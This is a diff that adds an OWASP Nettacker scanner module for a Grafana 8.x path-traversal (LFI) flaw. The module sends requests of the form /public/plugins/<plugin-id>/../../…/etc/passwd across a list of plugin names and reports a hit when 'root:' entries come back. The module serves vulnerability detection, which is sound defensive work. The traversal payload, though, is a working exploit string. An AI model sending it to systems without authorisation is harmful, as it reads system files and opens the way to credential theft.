@@ -1,0 +1,72 @@
+info:
+  name: grafana_zeroday_vuln
+  author: OWASP Nettacker Team
+  severity: 9
+  description:  Grafana unpatched 0 Day LFI is now being actively exploited, it affects only Grafana 8.0+, Vulnerable companies should revoke the secrets they store at their /etc/grafana/grafana.ini as there is no official fix in the meantime.
+  reference: 
+    - https://nosec.org/home/detail/4914.html
+    - https://github.com/jas502n/Grafana-VulnTips
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - critical_severity
+    - grafana
+    - 0day
+    - zeroday
+    - lfi
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        verify: false
+        timeout: 3
+        cert: ""
+        stream: false
+        proxies: ""
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/public/plugins/{{plugin-id}}/../../../../../../../../../../../../../../../../../../../etc/passwd"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+              plugin-id:
+                - grafana-clock-panel
+                - alertlist
+                - graph
+                - elasticsearch
+                - dashlist
+                - cloudwatch
+                - mysql
+                - influxdb
+                - heatmap
+                - graphite
+                - prometheus
+                - postgres
+                - pluginlist
+                - opentsdb
+                - text
+                - table
+                - stackdriver
+                - grafana-azure-monitor-datasource
+                - grafana-simple-json-datasource
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            content:
+              regex: "root:(\\S+):"
+              reverse: false
